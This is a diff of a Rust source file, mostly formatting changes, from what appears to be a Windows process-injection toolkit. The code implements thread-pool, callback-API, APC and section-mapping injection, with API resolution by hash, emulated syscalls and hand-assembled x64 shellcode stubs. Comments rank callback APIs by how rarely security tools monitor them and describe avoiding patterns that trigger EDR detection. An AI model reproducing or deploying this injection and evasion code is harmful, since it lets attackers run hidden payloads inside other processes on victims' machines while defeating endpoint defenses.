-        .ok_or_else(|| InjectionError::InjectionFailed {
-            technique: technique.clone(),
-            reason: "cannot resolve TpPostWork".to_string(),
-        })?;
+        let tp_post_work_addr =
+            pe_resolve::get_proc_address_by_hash(ntdll_base, pe_resolve::hash_str(b"TpPostWork\0"))
+                .ok_or_else(|| InjectionError::InjectionFailed {
+                    technique: technique.clone(),
+                    reason: "cannot resolve TpPostWork".to_string(),
+                })?;
 
         let tp_release_work_addr = pe_resolve::get_proc_address_by_hash(
             ntdll_base,
@@ -4508,10 +4471,7 @@ fn inject_threadpool_direct(
 /// payload as the callback, then triggers it by posting an async I/O
 /// completion. This is the highest-stealth variant because async I/O
 /// completions are extremely common and blend in with normal system behavior.
-fn inject_threadpool_async_io(
-    pid: u32,
-    payload: &[u8],
-) -> Result<InjectionHandle, InjectionError> {
+fn inject_threadpool_async_io(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
     let technique = InjectionTechnique::ThreadPool {
         variant: Some(ThreadPoolVariant::AsyncIo),
     };
@@ -4568,14 +4528,12 @@ fn inject_threadpool_async_io(
             reason: "cannot resolve TpReleaseIoCompletion".to_string(),
         })?;
 
-        let nt_close_addr = pe_resolve::get_proc_address_by_hash(
-            ntdll_base,
-            pe_resolve::hash_str(b"NtClose\0"),
-        )
-        .ok_or_else(|| InjectionError::InjectionFailed {
-            technique: technique.clone(),
-            reason: "cannot resolve NtClose".to_string(),
-        })?;
+        let nt_close_addr =
+            pe_resolve::get_proc_address_by_hash(ntdll_base, pe_resolve::hash_str(b"NtClose\0"))
+                .ok_or_else(|| InjectionError::InjectionFailed {
+                    technique: technique.clone(),
+                    reason: "cannot resolve NtClose".to_string(),
+                })?;
 
         // Build stub:
         // 1. NtCreateIoCompletion(&io_port, ..., ..., ...)
@@ -4751,22 +4709,22 @@ fn auto_select_callback_api() -> CallbackApi {
 
     match roll {
         // Rarely monitored (highest weight)
-        0..=29 => CallbackApi::CertEnumSystemStore,        // 30
+        0..=29 => CallbackApi::CertEnumSystemStore, // 30
         30..=54 => CallbackApi::SHEnumerateUnreadMailAccounts, // 25
-        55..=79 => CallbackApi::CopyFileEx,                // 25
-        80..=104 => CallbackApi::EnumResourceTypesW,       // 25
+        55..=79 => CallbackApi::CopyFileEx,         // 25
+        80..=104 => CallbackApi::EnumResourceTypesW, // 25
 
         // Moderately monitored
-        105..=124 => CallbackApi::EnumDesktopWindows,      // 20
-        125..=144 => CallbackApi::EnumFontFamilies,        // 20
-        145..=159 => CallbackApi::EnumerateLoadedModules,  // 15
-        160..=174 => CallbackApi::EnumTimeFormatsA,        // 15
+        105..=124 => CallbackApi::EnumDesktopWindows, // 20
+        125..=144 => CallbackApi::EnumFontFamilies,   // 20
+        145..=159 => CallbackApi::EnumerateLoadedModules, // 15
+        160..=174 => CallbackApi::EnumTimeFormatsA,   // 15
 
         // More commonly watched
-        175..=184 => CallbackApi::EnumSystemLocalesA,      // 10
-        185..=191 => CallbackApi::EnumChildWindows,        // 7
-        192..=196 => CallbackApi::EnumWindows,             // 5
-        _ => CallbackApi::CreateTimerQueueTimer,           // 3
+        175..=184 => CallbackApi::EnumSystemLocalesA, // 10
+        185..=191 => CallbackApi::EnumChildWindows,   // 7
+        192..=196 => CallbackApi::EnumWindows,        // 5
+        _ => CallbackApi::CreateTimerQueueTimer,      // 3
     }
 }
 
@@ -4988,9 +4946,8 @@ unsafe fn stage_callback_payload(
     technique: InjectionTechnique,
 ) -> Result<(*mut c_void, usize, usize), InjectionError> {
     use winapi::um::winnt::{
-        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
-        PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
-        PROCESS_VM_WRITE,
+        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_CREATE_THREAD,
+        PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
     };
 
     // Open target process.
@@ -5140,10 +5097,7 @@ unsafe fn stage_callback_payload(
 ///
 /// First tries to find the DLL by its hashed name, then resolves the
 /// function. Returns the function address or `None`.
-unsafe fn resolve_dll_function(
-    dll_hash: u32,
-    func_name: &[u8],
-) -> Option<usize> {
+unsafe fn resolve_dll_function(dll_hash: u32, func_name: &[u8]) -> Option<usize> {
     let dll_base = pe_resolve::get_module_handle_by_hash(dll_hash)?;
     pe_resolve::get_proc_address_by_hash(dll_base, pe_resolve::hash_str(func_name))
 }
@@ -5152,28 +5106,18 @@ unsafe fn resolve_dll_function(
 ///
 /// If the DLL is not already loaded, attempts LoadLibraryA via pe_resolve.
 /// Returns the function address or `None`.
-unsafe fn resolve_external_dll_function(
-    dll_name: &[u8],
-    func_name: &[u8],
-) -> Option<usize> {
+unsafe fn resolve_external_dll_function(dll_name: &[u8], func_name: &[u8]) -> Option<usize> {
     let dll_hash = pe_resolve::hash_str(dll_name);
 
     // Try to find already-loaded DLL first.
     if let Some(base) = pe_resolve::get_module_handle_by_hash(dll_hash) {
-        return pe_resolve::get_proc_address_by_hash(
-            base,
-            pe_resolve::hash_str(func_name),
-        );
+        return pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(func_name));
     }
 
     // DLL not loaded — try LoadLibraryA.
-    let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(
-        b"kernel32.dll\0",
-    ))?;
-    let load_library_a = pe_resolve::get_proc_address_by_hash(
-        kernel32,
-        pe_resolve::hash_str(b"LoadLibraryA\0"),
-    )?;
+    let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0"))?;
+    let load_library_a =
+        pe_resolve::get_proc_address_by_hash(kernel32, pe_resolve::hash_str(b"LoadLibraryA\0"))?;
 
     let load_library: extern "system" fn(*const u8) -> *mut c_void =
         std::mem::transmute(load_library_a);
@@ -5183,10 +5127,7 @@ unsafe fn resolve_external_dll_function(
         return None;
     }
 
-    pe_resolve::get_proc_address_by_hash(
-        dll_base as usize,
-        pe_resolve::hash_str(func_name),
-    )
+    pe_resolve::get_proc_address_by_hash(dll_base as usize, pe_resolve::hash_str(func_name))
 }
 
 // ── Callback API Variant 1: EnumSystemLocalesA ───────────────────────────────
@@ -5200,7 +5141,8 @@ fn inject_callback_enum_system_locales(
         api: Some(CallbackApi::EnumSystemLocalesA),
     };
     unsafe {
-        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;
+        let (h_proc, payload_base, stub_base) =
+            stage_callback_payload(pid, payload, technique.clone())?;
 
         // Resolve EnumSystemLocalesA from kernel32.
         let enum_func = resolve_dll_function(
@@ -5307,16 +5249,15 @@ fn inject_callback_enum_windows(
         api: Some(CallbackApi::EnumWindows),
     };
     unsafe {
-        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;
+        let (h_proc, payload_base, stub_base) =
+            stage_callback_payload(pid, payload, technique.clone())?;
 
-        let enum_func = resolve_dll_function(
-            pe_resolve::hash_str(b"user32.dll\0"),
-            b"EnumWindows\0",
-        )
-        .ok_or_else(|| InjectionError::InjectionFailed {
-            technique: technique.clone(),
-            reason: "cannot resolve EnumWindows".to_string(),
-        })?;
+        let enum_func =
+            resolve_dll_function(pe_resolve::hash_str(b"user32.dll\0"), b"EnumWindows\0")
+                .ok_or_else(|| InjectionError::InjectionFailed {
+                    technique: technique.clone(),
+                    reason: "cannot resolve EnumWindows".to_string(),
+                })?;
 
         // Build caller stub: EnumWindows(stub_base, 0)
         let mut caller = Vec::with_capacity(48);
@@ -5361,28 +5302,24 @@ fn inject_callback_enum_child_windows(
         api: Some(CallbackApi::EnumChildWindows),
     };
     unsafe {
-        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;
+        let (h_proc, payload_base, stub_base) =
+            stage_callback_payload(pid, payload, technique.clone())?;
 
-        let enum_func = resolve_dll_function(
-            pe_resolve::hash_str(b"user32.dll\0"),
-            b"EnumChildWindows\0",
-        )
-        .ok_or_else(|| InjectionError::InjectionFailed {
-            technique: technique.clone(),
-            reason: "cannot resolve EnumChildWindows".to_string(),
-        })?;
+        let enum_func =
+            resolve_dll_function(pe_resolve::hash_str(b"user32.dll\0"), b"EnumChildWindows\0")
+                .ok_or_else(|| InjectionError::InjectionFailed {
+                    technique: technique.clone(),
+                    reason: "cannot resolve EnumChildWindows".to_string(),
+                })?;
 
         // GetDesktopWindow to get a valid HWND parent.
-        let get_desktop = resolve_dll_function(
-            pe_resolve::hash_str(b"user32.dll\0"),
-            b"GetDesktopWindow\0",
-        )
-        .ok_or_else(|| InjectionError::InjectionFailed {
-            technique: technique.clone(),
-            reason: "cannot resolve GetDesktopWindow".to_string(),
-        })?;
-        let get_desktop_wnd: extern "system" fn() -> usize =
-            std::mem::transmute(get_desktop);
+        let get_desktop =
+            resolve_dll_function(pe_resolve::hash_str(b"user32.dll\0"), b"GetDesktopWindow\0")
+                .ok_or_else(|| InjectionError::InjectionFailed {
+                    technique: technique.clone(),
+                    reason: "cannot resolve GetDesktopWindow".to_string(),
+                })?;
+        let get_desktop_wnd: extern "system" fn() -> usize = std::mem::transmute(get_desktop);
         let hwnd_desktop = get_desktop_wnd();
 
         // Build caller stub: EnumChildWindows(hwnd_desktop, stub_base, 0)
@@ -5428,7 +5365,8 @@ fn inject_callback_enum_desktop_windows(
         api: Some(CallbackApi::EnumDesktopWindows),
     };
     unsafe {
-        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;
+        let (h_proc, payload_base, stub_base) =
+            stage_callback_payload(pid, payload, technique.clone())?;
 
         let enum_func = resolve_dll_function(
             pe_resolve::hash_str(b"user32.dll\0"),
@@ -5439,14 +5377,12 @@ fn inject_callback_enum_desktop_windows(
             reason: "cannot resolve EnumDesktopWindows".to_string(),
         })?;
 
-        let get_thread_desktop = resolve_dll_function(
-            pe_resolve::hash_str(b"user32.dll\0"),
-            b"GetThreadDesktop\0",
-        )
-        .ok_or_else(|| InjectionError::InjectionFailed {
-            technique: technique.clone(),
-            reason: "cannot resolve GetThreadDesktop".to_string(),
-        })?;
+        let get_thread_desktop =
+            resolve_dll_function(pe_resolve::hash_str(b"user32.dll\0"), b"GetThreadDesktop\0")
+                .ok_or_else(|| InjectionError::InjectionFailed {
+                    technique: technique.clone(),
+                    reason: "cannot resolve GetThreadDesktop".to_string(),
+                })?;
         let get_current_thread_id = resolve_dll_function(
             pe_resolve::hash_str(b"kernel32.dll\0"),
             b"GetCurrentThreadId\0",
@@ -5503,7 +5439,8 @@ fn inject_callback_create_timer_queue(
         api: Some(CallbackApi::CreateTimerQueueTimer),
     };
     unsafe {
-        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;
+        let (h_proc, payload_base, stub_base) =
+            stage_callback_payload(pid, payload, technique.clone())?;
 
         let create_tqt = resolve_dll_function(
             pe_resolve::hash_str(b"kernel32.dll\0"),
@@ -5535,7 +5472,7 @@ fn inject_callback_create_timer_queue(
         caller.extend_from_slice(&[0x31, 0xD2]);
         // mov r8, stub_base (callback)
         caller.extend_from_slice(&[0x4C, 0x8B, 0xC0]); // will be overwritten
-        // mov r8, imm64
+                                                       // mov r8, imm64
         caller.extend_from_slice(&[0x49, 0xB8]);
         caller.extend_from_slice(&(stub_base as u64).to_le_bytes());
         // xor r9d, r9d (Parameter = NULL)
@@ -5634,7 +5571,8 @@ fn inject_callback_enum_time_formats(
         api: Some(CallbackApi::EnumTimeFormatsA),
     };
     unsafe {
-        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;
+        let (h_proc, payload_base, stub_base) =
+            stage_callback_payload(pid, payload, technique.clone())?;
 
         let enum_func = resolve_dll_function(
             pe_resolve::hash_str(b"kernel32.dll\0"),
@@ -5689,7 +5627,8 @@ fn inject_callback_enum_resource_types(
         api: Some(CallbackApi::EnumResourceTypesW),
     };
     unsafe {
-        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;
+        let (h_proc, payload_base, stub_base) =
+            stage_callback_payload(pid, payload, technique.clone())?;
 
         let enum_func = resolve_dll_function(
             pe_resolve::hash_str(b"kernel32.dll\0"),
@@ -5757,7 +5696,8 @@ fn inject_callback_enum_font_families(
         api: Some(CallbackApi::EnumFontFamilies),
     };
     unsafe {
-        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;
+        let (h_proc, payload_base, stub_base) =
+            stage_callback_payload(pid, payload, technique.clone())?;
 
         let enum_func = resolve_dll_function(
             pe_resolve::hash_str(b"gdi32.dll\0"),
@@ -5768,23 +5708,17 @@ fn inject_callback_enum_font_families(
             reason: "cannot resolve EnumFontFamiliesExW".to_string(),
         })?;
 
-        let get_dc = resolve_dll_function(
-            pe_resolve::hash_str(b"user32.dll\0"),
-            b"GetDC\0",
-        )
-        .ok_or_else(|| InjectionError::InjectionFailed {
-            technique: technique.clone(),
-            reason: "cannot resolve GetDC".to_string(),
-        })?;
+        let get_dc = resolve_dll_function(pe_resolve::hash_str(b"user32.dll\0"), b"GetDC\0")
+            .ok_or_else(|| InjectionError::InjectionFailed {
+                technique: technique.clone(),
+                reason: "cannot resolve GetDC".to_string(),
+            })?;
 
-        let release_dc = resolve_dll_function(
-            pe_resolve::hash_str(b"user32.dll\0"),
-            b"ReleaseDC\0",
-        );
+        let release_dc =
+            resolve_dll_function(pe_resolve::hash_str(b"user32.dll\0"), b"ReleaseDC\0");
 
         // GetDC(NULL) → screen DC
-        let get_dc_fn: extern "system" fn(*mut c_void) -> *mut c_void =
-            std::mem::transmute(get_dc);
+        let get_dc_fn: extern "system" fn(*mut c_void) -> *mut c_void = std::mem::transmute(get_dc);
         let hdc = get_dc_fn(std::ptr::null_mut());
 
         // We need a LOGFONT structure with lfFaceName[0]=0 (enumerate all).
@@ -5829,7 +5763,7 @@ fn inject_callback_enum_font_families(
         caller.extend_from_slice(&[0x49, 0xB8]); // mov r8, stub_base
         caller.extend_from_slice(&(stub_base as u64).to_le_bytes());
         caller.extend_from_slice(&[0x45, 0x31, 0xC9]); // xor r9d, r9d (lParam=0)
-        // mov dword [rsp+0x20], 0 (dwFlags=0)
+                                                       // mov dword [rsp+0x20], 0 (dwFlags=0)
         caller.extend_from_slice(&[0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00]);
         caller.extend_from_slice(&[0x48, 0xB8]); // mov rax, EnumFontFamiliesExW
         caller.extend_from_slice(&(enum_func as u64).to_le_bytes());
@@ -5877,14 +5811,12 @@ fn inject_callback_cert_enum_system_store(
         api: Some(CallbackApi::CertEnumSystemStore),
     };
     unsafe {
-        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;
+        let (h_proc, payload_base, stub_base) =
+            stage_callback_payload(pid, payload, technique.clone())?;
 
         // CertEnumSystemStore is in crypt32.dll — load it dynamically.
-        let cert_enum = resolve_external_dll_function(
-            b"crypt32.dll\0",
-            b"CertEnumSystemStore\0",
-        )
-        .ok_or_else(|| InjectionError::InjectionFailed {
+        let cert_enum = resolve_external_dll_function(b"crypt32.dll\0", b"CertEnumSystemStore\0")
+            .ok_or_else(|| InjectionError::InjectionFailed {
             technique: technique.clone(),
             reason: "cannot resolve CertEnumSystemStore from crypt32.dll".to_string(),
         })?;
@@ -5893,14 +5825,14 @@ fn inject_callback_cert_enum_system_store(
         // CertEnumSystemStore(0x00020000, NULL, stub_base, NULL)
         let mut caller = Vec::with_capacity(48);
         caller.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
-        // mov ecx, 0x00020000 (dwFlags)
+                                                             // mov ecx, 0x00020000 (dwFlags)
         caller.extend_from_slice(&[0xB9, 0x00, 0x00, 0x02, 0x00]);
         caller.extend_from_slice(&[0x31, 0xD2]); // xor edx, edx (pvSystemStorePara=NULL)
         caller.extend_from_slice(&[0x49, 0xB8]); // mov r8, stub_base
         caller.extend_from_slice(&(stub_base as u64).to_le_bytes());
         caller.extend_from_slice(&[0x45, 0x31, 0xC0]); // xor r8d, r8d — wait, r8 is already set
-        // Actually: arg3 = r8 = pfnEnum (callback), arg4 = r9 = pvArg (NULL)
-        // r8 already has stub_base. Set r9 to NULL.
+                                                       // Actually: arg3 = r8 = pfnEnum (callback), arg4 = r9 = pvArg (NULL)
+                                                       // r8 already has stub_base. Set r9 to NULL.
         caller.truncate(caller.len() - 3); // remove the xor r8d
         caller.extend_from_slice(&[0x45, 0x31, 0xC9]); // xor r9d, r9d (pvArg=NULL)
         caller.extend_from_slice(&[0x48, 0xB8]); // mov rax, CertEnumSystemStore
@@ -5938,17 +5870,17 @@ fn inject_callback_sh_enum_unread_mail(
         api: Some(CallbackApi::SHEnumerateUnreadMailAccounts),
     };
     unsafe {
-        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;
+        let (h_proc, payload_base, stub_base) =
+            stage_callback_payload(pid, payload, technique.clone())?;
 
         // SHEnumerateUnreadMailAccountsW is in shell32.dll.
-        let enum_func = resolve_external_dll_function(
-            b"shell32.dll\0",
-            b"SHEnumerateUnreadMailAccountsW\0",
-        )
-        .ok_or_else(|| InjectionError::InjectionFailed {
-            technique: technique.clone(),
-            reason: "cannot resolve SHEnumerateUnreadMailAccountsW from shell32.dll".to_string(),
-        })?;
+        let enum_func =
+            resolve_external_dll_function(b"shell32.dll\0", b"SHEnumerateUnreadMailAccountsW\0")
+                .ok_or_else(|| InjectionError::InjectionFailed {
+                    technique: technique.clone(),
+                    reason: "cannot resolve SHEnumerateUnreadMailAccountsW from shell32.dll"
+                        .to_string(),
+                })?;
 
         // SHEnumerateUnreadMailAccountsW(NULL, 0, stub_base, 0)
         let mut caller = Vec::with_capacity(48);
@@ -5958,9 +5890,9 @@ fn inject_callback_sh_enum_unread_mail(
         caller.extend_from_slice(&[0x49, 0xB8]); // mov r8, stub_base
         caller.extend_from_slice(&(stub_base as u64).to_le_bytes());
         caller.extend_from_slice(&[0x45, 0x31, 0xC9]); // xor r9d, r9d (pvArg=0... actually this is cbCallback)
-        // Actually SHEnumerateUnreadMailAccountsW signature:
-        // HRESULT SHEnumerateUnreadMailAccountsW(HKEY hKey, DWORD dwFlags, pfnEnum, LPARAM)
-        // 4 args: rcx=hKey, rdx=dwFlags, r8=pfnEnum, r9=lParam
+                                                       // Actually SHEnumerateUnreadMailAccountsW signature:
+                                                       // HRESULT SHEnumerateUnreadMailAccountsW(HKEY hKey, DWORD dwFlags, pfnEnum, LPARAM)
+                                                       // 4 args: rcx=hKey, rdx=dwFlags, r8=pfnEnum, r9=lParam
         caller.extend_from_slice(&[0x48, 0xB8]); // mov rax, SHEnumerateUnreadMailAccountsW
         caller.extend_from_slice(&(enum_func as u64).to_le_bytes());
         caller.extend_from_slice(&[0xFF, 0xD0]); // call rax
@@ -5996,17 +5928,16 @@ fn inject_callback_enumerate_loaded_modules(
         api: Some(CallbackApi::EnumerateLoadedModules),
     };
     unsafe {
-        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;
+        let (h_proc, payload_base, stub_base) =
+            stage_callback_payload(pid, payload, technique.clone())?;
 
         // EnumerateLoadedModulesW64 is in dbghelp.dll.
-        let enum_func = resolve_external_dll_function(
-            b"dbghelp.dll\0",
-            b"EnumerateLoadedModulesW64\0",
-        )
-        .ok_or_else(|| InjectionError::InjectionFailed {
-            technique: technique.clone(),
-            reason: "cannot resolve EnumerateLoadedModulesW64 from dbghelp.dll".to_string(),
-        })?;
+        let enum_func =
+            resolve_external_dll_function(b"dbghelp.dll\0", b"EnumerateLoadedModulesW64\0")
+                .ok_or_else(|| InjectionError::InjectionFailed {
+                    technique: technique.clone(),
+                    reason: "cannot resolve EnumerateLoadedModulesW64 from dbghelp.dll".to_string(),
+                })?;
 
         // We need a process handle. Use GetCurrentProcess for self-enumeration,
         // or DuplicateHandle to get one for the target.
@@ -6071,16 +6002,15 @@ fn inject_callback_copy_file_ex(
         api: Some(CallbackApi::CopyFileEx),
     };
     unsafe {
-        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;
+        let (h_proc, payload_base, stub_base) =
+            stage_callback_payload(pid, payload, technique.clone())?;
 
-        let copy_file_ex = resolve_dll_function(
-            pe_resolve::hash_str(b"kernel32.dll\0"),
-            b"CopyFileExW\0",
-        )
-        .ok_or_else(|| InjectionError::InjectionFailed {
-            technique: technique.clone(),
-            reason: "cannot resolve CopyFileExW".to_string(),
-        })?;
+        let copy_file_ex =
+            resolve_dll_function(pe_resolve::hash_str(b"kernel32.dll\0"), b"CopyFileExW\0")
+                .ok_or_else(|| InjectionError::InjectionFailed {
+                    technique: technique.clone(),
+                    reason: "cannot resolve CopyFileExW".to_string(),
+                })?;
 
         // Create temporary source and destination file paths.
         // We write wide strings for: src = "C:\__la_cb_src.tmp", dst = "C:\__la_cb_dst.tmp"
@@ -6165,13 +6095,13 @@ fn inject_callback_copy_file_ex(
             0x40000000u64, // GENERIC_WRITE
             &mut obj_attr as *mut _ as u64,
             io_status_block.as_mut_ptr() as u64,
-            0u64, // AllocationSize
+            0u64,    // AllocationSize
             0x80u64, // FILE_ATTRIBUTE_NORMAL
-            0u64, // ShareAccess
-            2u64, // FILE_OVERWRITE_IF (create or overwrite)
-            0u64, // CreateOptions (non-directory)
-            0u64, // EaBuffer
-            0u64, // EaLength
+            0u64,    // ShareAccess
+            2u64,    // FILE_OVERWRITE_IF (create or overwrite)
+            0u64,    // CreateOptions (non-directory)
+            0u64,    // EaBuffer
+            0u64,    // EaLength
         );
 
         if h_file != 0 {
@@ -6196,10 +6126,8 @@ fn inject_callback_copy_file_ex(
         // Build caller stub:
         // CopyFileExW(remote_src, remote_dst, stub_base, NULL, NULL, 0)
         // Then: DeleteFileW(remote_src), DeleteFileW(remote_dst)
-        let delete_file_w = resolve_dll_function(
-            pe_resolve::hash_str(b"kernel32.dll\0"),
-            b"DeleteFileW\0",
-        );
+        let delete_file_w =
+            resolve_dll_function(pe_resolve::hash_str(b"kernel32.dll\0"), b"DeleteFileW\0");
 
         let mut caller = Vec::with_capacity(128);
         caller.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
@@ -6210,7 +6138,7 @@ fn inject_callback_copy_file_ex(
         caller.extend_from_slice(&[0x49, 0xB8]); // mov r8, stub_base (progress callback)
         caller.extend_from_slice(&(stub_base as u64).to_le_bytes());
         caller.extend_from_slice(&[0x45, 0x31, 0xC9]); // xor r9d, r9d (pvData=NULL)
-        // mov qword [rsp+0x20], 0 (pbCancel=NULL)
+                                                       // mov qword [rsp+0x20], 0 (pbCancel=NULL)
         caller.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00]);
         // mov dword [rsp+0x28], 0 (dwCopyFlags=0)
         caller.extend_from_slice(&[0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00]);
@@ -6390,10 +6318,7 @@ fn page_align(size: usize) -> usize {
 /// Returns the thread handle and TID if found. Uses NtQuerySystemInformation
 /// to enumerate threads, then NtOpenThread + NtQueryInformationThread to
 /// check if the thread is alertable.
-unsafe fn find_alertable_thread(
-    _h_proc: *mut c_void,
-    pid: u32,
-) -> Option<(*mut c_void, u32)> {
+unsafe fn find_alertable_thread(_h_proc: *mut c_void, pid: u32) -> Option<(*mut c_void, u32)> {
     use winapi::um::winnt::{THREAD_QUERY_INFORMATION, THREAD_SET_CONTEXT};
 
     // Query system thread information to find threads in the target process.
@@ -6405,10 +6330,10 @@ unsafe fn find_alertable_thread(
     )?;
 
     type NtQuerySystemInformationFn = unsafe extern "system" fn(
-        u32,              // SystemInformationClass (SystemProcessInformation = 5)
-        *mut c_void,      // SystemInformation
-        u32,              // SystemInformationLength
-        *mut u32,         // ReturnLength
+        u32,         // SystemInformationClass (SystemProcessInformation = 5)
+        *mut c_void, // SystemInformation
+        u32,         // SystemInformationLength
+        *mut u32,    // ReturnLength
     ) -> i32;
 
     let query_fn: NtQuerySystemInformationFn = std::mem::transmute(nt_query_info);
@@ -6418,14 +6343,11 @@ unsafe fn find_alertable_thread(
     let mut buf: Vec<u8> = Vec::with_capacity(buf_size as usize);
     let mut ret_len = 0u32;
 
-    let status = query_fn(
-        5,
-        buf.as_mut_ptr() as *mut c_void,
-        buf_size,
-        &mut ret_len,
-    );
+    let status = query_fn(5, buf.as_mut_ptr() as *mut c_void, buf_size, &mut ret_len);
 
-    if status < 0 && status != 0x00000105 /* STATUS_INFO_LENGTH_MISMATCH */ {
+    if status < 0 && status != 0x00000105
+    /* STATUS_INFO_LENGTH_MISMATCH */
+    {
         return None;
     }
 
@@ -6546,9 +6468,9 @@ fn inject_section_mapping(
         let mut large_size: i64 = aligned_size as i64;
 
         let section_protection: u64 = 0x04; // PAGE_READWRITE — always
-        // Section protection is separate from view protection. The target process
-        // view is set to PAGE_EXECUTE_READ after writing. RWX sections are a
-        // high-priority EDR detection signal.
+                                            // Section protection is separate from view protection. The target process
+                                            // view is set to PAGE_EXECUTE_READ after writing. RWX sections are a
+                                            // high-priority EDR detection signal.
 
         // SEC_COMMIT = 0x8000000
         // SECTION_ALL_ACCESS = 0x000F001F
@@ -6557,11 +6479,11 @@ fn inject_section_mapping(
             "NtCreateSection",
             &mut h_section as *mut _ as u64,
             0x000F_001Fu64, // SECTION_ALL_ACCESS
-            0u64,            // ObjectAttributes = NULL
+            0u64,           // ObjectAttributes = NULL
             &mut large_size as *mut _ as u64,
             section_protection,
             0x0800_0000u64, // SEC_COMMIT
-            0u64,            // FileHandle = NULL (pagefile-backed)
+            0u64,           // FileHandle = NULL (pagefile-backed)
         );
         let create_status_code = create_status.unwrap_or(-1);
 
@@ -6598,13 +6520,13 @@ fn inject_section_mapping(
             h_section as u64,
             (-1isize) as u64, // NtCurrentProcess()
             &mut local_base as *mut _ as u64,
-            0u64,             // ZeroBits
-            0u64,             // CommitSize
-            0u64,             // SectionOffset = NULL
+            0u64, // ZeroBits
+            0u64, // CommitSize
+            0u64, // SectionOffset = NULL
             &mut view_size as *mut _ as u64,
-            2u64,             // ViewUnmap
-            0u64,             // AllocationType
-            0x04u64,          // PAGE_READWRITE
+            2u64,    // ViewUnmap
+            0u64,    // AllocationType
+            0x04u64, // PAGE_READWRITE
         );
         let map_local_status_code = map_local_status.unwrap_or(-1);
 
@@ -6620,11 +6542,7 @@ fn inject_section_mapping(
         }
 
         // Write payload into local mapping.
-        std::ptr::copy_nonoverlapping(
-            payload.as_ptr(),
-            local_base as *mut u8,
-            payload.len(),
-        );
+        std::ptr::copy_nonoverlapping(payload.as_ptr(), local_base as *mut u8, payload.len());
 
         // Unmap from our process — the section object retains the data.
         let _ = crate::emulated_syscall!(
@@ -6636,13 +6554,12 @@ fn inject_section_mapping(
         // ── Step 3: Open target process ────────────────────────────────
         //
         // Determine access rights based on execution method.
-        let need_thread = exec_method.unwrap_or(SectionExecMethod::Thread)
-            == SectionExecMethod::Thread;
-        let h_proc = open_target_for_section_map(pid, need_thread)
-            .map_err(|e| {
-                let _ = crate::emulated_syscall!("NtClose", h_section as u64);
-                e
-            })?;
+        let need_thread =
+            exec_method.unwrap_or(SectionExecMethod::Thread) == SectionExecMethod::Thread;
+        let h_proc = open_target_for_section_map(pid, need_thread).map_err(|e| {
+            let _ = crate::emulated_syscall!("NtClose", h_section as u64);
+            e
+        })?;
 
         // ── Step 4: Map into target process ────────────────────────────
         //
@@ -6663,12 +6580,12 @@ fn inject_section_mapping(
             h_section as u64,
             h_proc as u64,
             &mut remote_base as *mut _ as u64,
-            0u64,                // ZeroBits
-            0u64,                // CommitSize
-            0u64,                // SectionOffset = NULL
+            0u64, // ZeroBits
+            0u64, // CommitSize
+            0u64, // SectionOffset = NULL
             &mut remote_view_size as *mut _ as u64,
-            2u64,                // ViewUnmap
-            0u64,                // AllocationType
+            2u64, // ViewUnmap
+            0u64, // AllocationType
             target_protection,
         );
         let map_target_status_code = map_target_status.unwrap_or(-1);
@@ -6850,44 +6767,41 @@ unsafe fn build_section_callback_caller(
     // Resolve the callback API function in the target process's context.
     // The caller stub will call this API with payload_addr as arg1.
     let api_func: u64 = match api {
-        CallbackApi::EnumSystemLocalesA => {
-            resolve_dll_function(pe_resolve::hash_str(b"kernel32.dll\0"), b"EnumSystemLocalesA\0")
-        }
+        CallbackApi::EnumSystemLocalesA => resolve_dll_function(
+            pe_resolve::hash_str(b"kernel32.dll\0"),
+            b"EnumSystemLocalesA\0",
+        ),
         CallbackApi::EnumWindows => {
             resolve_dll_function(pe_resolve::hash_str(b"user32.dll\0"), b"EnumWindows\0")
         }
         CallbackApi::EnumChildWindows => {
             resolve_dll_function(pe_resolve::hash_str(b"user32.dll\0"), b"EnumChildWindows\0")
         }
-        CallbackApi::EnumDesktopWindows => {
-            resolve_dll_function(pe_resolve::hash_str(b"user32.dll\0"), b"EnumDesktopWindows\0")
-        }
-        CallbackApi::CreateTimerQueueTimer => {
-            resolve_dll_function(
-                pe_resolve::hash_str(b"kernel32.dll\0"),
-                b"CreateTimerQueueTimer\0",
-            )
-        }
-        CallbackApi::EnumTimeFormatsA => {
-            resolve_dll_function(pe_resolve::hash_str(b"kernel32.dll\0"), b"EnumTimeFormatsA\0")
-        }
-        CallbackApi::EnumResourceTypesW => {
-            resolve_dll_function(
-                pe_resolve::hash_str(b"kernel32.dll\0"),
-                b"EnumResourceTypesW\0",
-            )
-        }
-        CallbackApi::EnumFontFamilies => {
-            resolve_dll_function(pe_resolve::hash_str(b"gdi32.dll\0"), b"EnumFontFamiliesExW\0")
-        }
